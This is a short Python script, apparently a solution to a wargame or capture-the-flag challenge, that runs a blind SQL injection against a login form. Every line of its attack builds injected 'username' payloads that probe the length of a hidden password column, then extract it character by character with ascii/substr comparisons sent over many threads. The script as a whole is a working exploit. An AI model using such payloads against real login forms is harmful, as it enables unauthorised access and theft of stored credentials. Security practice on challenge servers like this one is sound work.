import requests
from concurrent.futures import ThreadPoolExecutor
from itertools import count

session = requests.Session()

def check_length():  
  for i in count(1):
    payload = f"admin'&&length((select `3` from (select 1,2,3 union select * from user) t limit 1 offset 1)) like {i}#"
    data={
      'username':payload,
      'password':'d'
    }
    res=session.post(url, data=data)
    if 'Hello' in res.text:
      print(i)
      return i

def attack(n):
  for i in range(32,127):
    payload=f"admin'&&ascii(substr((select `3` from (select 1,2,3 union select * from user) t limit 1 offset 1),{n},1)) like {i}#"
    data={
      'username':payload,
      'password':'d'
    }
    res = session.post(url, data=data)
    if 'Hello' in res.text:
      print(i)
      return chr(i)

def find_char(length):
  with ThreadPoolExecutor(max_workers=length) as excutuer:
    results = excutuer.map(attack, range(1,length+1))
  return ''.join(results)
  
url = "http://war.knock-on.org:33753/login"
# sleep_time=1.5
length = check_length()
password = find_char(length)
print(password)
